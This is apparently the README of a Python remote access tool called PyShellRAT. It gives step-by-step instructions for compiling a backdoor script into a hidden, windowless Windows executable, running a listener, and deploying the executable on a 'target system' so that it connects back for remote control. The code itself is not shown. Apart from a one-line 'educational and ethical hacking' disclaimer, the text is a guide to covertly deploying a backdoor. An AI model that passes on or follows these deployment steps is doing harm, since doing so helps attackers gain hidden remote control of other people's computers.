# PyShellRAT-Python-Based-Remote-Access-Tool
🚀 How to Use PyShellRAT
🔧 Setup & Compilation
Make sure you're in the same directory where backdoor.py is located.

If PyInstaller is not installed, install it using:
pip install pyinstaller

To compile backdoor.py into a standalone executable, run:
python -m PyInstaller backdoor.py --onefile --noconsole

This will create a single .exe file inside the dist folder.

You only need the .exe file from the dist folder — all other generated files and folders can be ignored.

🖥️ Running the Server
Before starting, open both server.py and backdoor.py and make sure the IP address is set to your correct local IP address (e.g., 192.168.x.x).

Start the server to listen for incoming connections by running:
python3 server.py

💻 Deploying the Backdoor
Run the .exe file (generated from backdoor.py) on the target system.

Once executed, the backdoor will attempt to connect to the server using the IP and port specified.

❌ Terminating the Connection
To stop the connection and close the backdoor session, type the following in the server terminal:
quit

This command will stop the session and prevent the backdoor from running further.

⚠️ Important Notes
Always use your correct local IP address (you can find it using ipconfig on Windows or ifconfig / ip a on Linux).

Run server.py first before executing the .exe file on the target machine.

This tool is intended for educational and ethical hacking purposes only. Do not use it on unauthorized systems.
